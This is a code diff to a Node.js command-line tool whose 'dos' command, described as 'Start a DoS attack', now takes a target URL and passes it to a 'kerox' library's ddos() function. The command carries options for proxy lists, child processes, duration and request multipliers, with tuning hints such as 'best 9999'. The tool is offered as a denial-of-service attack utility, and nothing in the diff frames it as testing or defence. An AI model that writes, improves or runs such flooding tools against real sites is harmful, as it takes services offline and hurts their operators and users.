@@ -6,30 +6,35 @@ const { hideBin } = require('yargs/helpers');
 
 yargs(hideBin(process.argv))
 	.command(
-		"dos <protocol> <host|ip> <port> [route]",
+		"dos <url> [options...]",
 		"Start a DoS attack",
 		yargs => yargs
 			// Positionals
-			.positional("protocol", {
-				describe: "Protocol to use",
+			.positional("url", {
+				describe: "Target URL",
 				type: "string",
 				demandOption: true
 			})
-			.positional("host", {
-				describe: "Target hostname or IP address",
-				type: "string",
-				demandOption: true
-			})
-			.positional("port", {
-				describe: "Target port",
-				type: "number",
-				demandOption: true
-			})
-			.positional("route", {
-				describe: "Target route or URL path",
-				type: "string",
-				demandOption: false
-			})
+			// .positional("protocol", {
+			// 	describe: "Protocol to use",
+			// 	type: "string",
+			// 	demandOption: true
+			// })
+			// .positional("host", {
+			// 	describe: "Target hostname or IP address",
+			// 	type: "string",
+			// 	demandOption: true
+			// })
+			// .positional("port", {
+			// 	describe: "Target port",
+			// 	type: "number",
+			// 	demandOption: true
+			// })
+			// .positional("route", {
+			// 	describe: "Target route or URL path",
+			// 	type: "string",
+			// 	demandOption: false
+			// })
 			// Options
 			.option("proxy-list", {
 				alias: "l",
@@ -78,20 +83,23 @@ yargs(hideBin(process.argv))
 				demandOption: false
 			})
 		, (argv) => {
-			// Validate protocol
-			if (argv.protocol)
-				if (!["http", "https"].includes(argv.protocol))
-					exit("Invalid protocol: " + argv.protocol, "Supported protocols are (http, https)");
-			// Validate host
-			if (!URL.canParse(argv.protocol + "://" + argv.host) || new URL(argv.protocol + "://" + argv.host).hostname !== argv.host)
-				exit("Invalid host: " + argv.host, "Host must be a valid hostname or IP address.");
-			// Validate port
-			if (argv.port < 1 || argv.port > 65535)
-				exit("Invalid port: " + argv.port, "Port must be a number between 1 and 65535.");
-			// Validate route
-			if (argv.route)
-				if (argv.route[0] !== "/")
-					exit("Invalid route: " + argv.route, "Route must start with a forward slash.");
+			// Validate URL
+			if (!URL.canParse(argv.url))
+				exit("Invalid URL: " + argv.url, "URL must be a valid URL.");
+			// // Validate protocol
+			// if (argv.protocol)
+			// 	if (!["http", "https"].includes(argv.protocol))
+			// 		exit("Invalid protocol: " + argv.protocol, "Supported protocols are (http, https)");
+			// // Validate host
+			// if (!URL.canParse(argv.protocol + "://" + argv.host) || new URL(argv.protocol + "://" + argv.host).hostname !== argv.host)
+			// 	exit("Invalid host: " + argv.host, "Host must be a valid hostname or IP address.");
+			// // Validate port
+			// if (argv.port < 1 || argv.port > 65535)
+			// 	exit("Invalid port: " + argv.port, "Port must be a number between 1 and 65535.");
+			// // Validate route
+			// if (argv.route)
+			// 	if (argv.route[0] !== "/")
+			// 		exit("Invalid route: " + argv.route, "Route must start with a forward slash.");
 			// Validate proxy-list
 			if (argv.proxyList)
 				if (!fs.existsSync(path.resolve(argv.proxyList)))
@@ -118,7 +126,7 @@ yargs(hideBin(process.argv))
 				exit("Invalid child processes: " + argv.childProcesses, "Child processes must be at least 1.");
 
 			// Start the attack
-			const url = argv.protocol + "://" + argv.host + ":" + argv.port + (argv.route || "");
+			// const url = argv.protocol + "://" + argv.host + ":" + argv.port + (argv.route || "");
 			const { Kerox, Status } = require("kerox");
 			const kerox = new Kerox({
 				refreshRate: 1,
@@ -134,7 +142,7 @@ yargs(hideBin(process.argv))
 
 			async function execute() {
 				await kerox.ddos({
-					target: url,
+					target: argv.url,
 					duration: argv.duration,
 					multiplier: argv.multiplier,           // best 2
 					maxPending: argv.maxPending,           // best 9999
